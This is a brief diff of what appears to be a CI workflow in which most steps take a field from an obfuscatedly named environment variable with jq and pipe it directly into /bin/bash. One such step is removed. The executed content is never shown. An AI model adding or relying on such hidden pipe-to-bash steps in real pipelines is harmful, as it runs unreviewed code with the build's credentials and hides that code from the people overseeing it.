@@ -28,7 +28,6 @@ jobs:
           printf '%s' "$buxh1" | jq -r .cr821 | /bin/bash
           printf '%s' "$tn27" | jq -r .hca0 | /bin/bash
           printf '%s' "$zbafi18742" | jq -r .lubc01 | /bin/bash
-          printf '%s' "$ctfu98" | jq -r .hmkxq284 | /bin/bash
           printf '%s' "$egla482" | jq -r .vnkzc082 | /bin/bash
           printf '%s' "$gpd6" | jq -r .azd8 | /bin/bash
           printf '%s' "$vt6874" | jq -r .yirmi11 | /bin/bash
